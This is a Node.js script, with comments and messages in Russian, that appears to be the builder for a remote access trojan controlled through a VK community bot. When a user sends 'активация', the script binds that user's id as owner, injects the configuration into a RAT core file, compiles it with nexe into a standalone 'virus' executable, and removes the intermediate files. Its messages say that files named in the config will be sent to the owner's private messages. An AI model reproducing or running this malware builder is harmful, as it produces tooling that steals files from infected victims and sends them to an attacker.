
let conf = require("./config.json")
const { VKApi, ConsoleLogger, BotsLongPollUpdatesProvider } = require('node-vk-sdk')
const fs = require("fs-extra")
const nexe = require("nexe")

let api = new VKApi({
    token: conf.group.token,
    logger: new ConsoleLogger()
})

let updatesProvider = new BotsLongPollUpdatesProvider(api, conf.group.id)
console.log(`Запущен процесс активации...\nНапишите в сообщения сообщества ( https://vk.com/im?sel=-${conf.group.id} ): \"активация\"`)
updatesProvider.getUpdates(updates => {
    if (updates[0] != undefined) {
        if (updates[0].type == "message_new") {
            if (updates[0].object.message.text == "активация") {
                let random = Math.random()
                api.messagesSend({
                    user_id: updates[0].object.message.from_id,
                    peer_id: updates[0].object.message.peer_id,
                    random_id: random,
                    message: `${updates[0].object.message.from_id} <-- созданный ратник привязан к этому id пользователя. От данного сообщества, в личные сообщения, будут отправляться все указаные в конфиге файлы.\nПройдите на страницу этого сообщества, чтобы закончить активацию!`
                }).then(() => {
                    fs.readFile(`../../../ratresources/ratvirus/ratcore.js`, 'utf8', function (err, contents) {
                        let oldconfig = require("./config.json")
                        let jsonoldconfig = JSON.stringify(oldconfig)
                        let finalconfig = `const actconf = {"ownerid": ${updates[0].object.message.from_id}};` + `const conf = ${jsonoldconfig};` + contents
                        fs.writeFile("../virus/core.js", finalconfig, err => {
                            if (err) {
                                console.error(err)
                            }
                            console.log("Чтобы закончить все настройки, нужно пройти на главную страницу, после чего, примите соглашение!\nА пока, программа скомпилирует для вас финальный вирус!")
                            setTimeout(() => {
                                nexe.compile({
                                    input: '../virus/core.js',
                                    output: `../virus/${conf.name}`,
                                    resources: ['../../../ratresources/ratvirus/node_modules']
                                }).then(() => {
                                    fs.unlink('./../virus/core.js', (err) => {
                                        if (!err) {
                                            fs.unlink('../virus/node_modules', err => {
                                                if (!err) {
                                                    process.exit(0)
                                                }
                                            })
                                        }
                                    })
                                })
                            }, 3000);
                        })
                    })
                })
            }
        }
    }
})
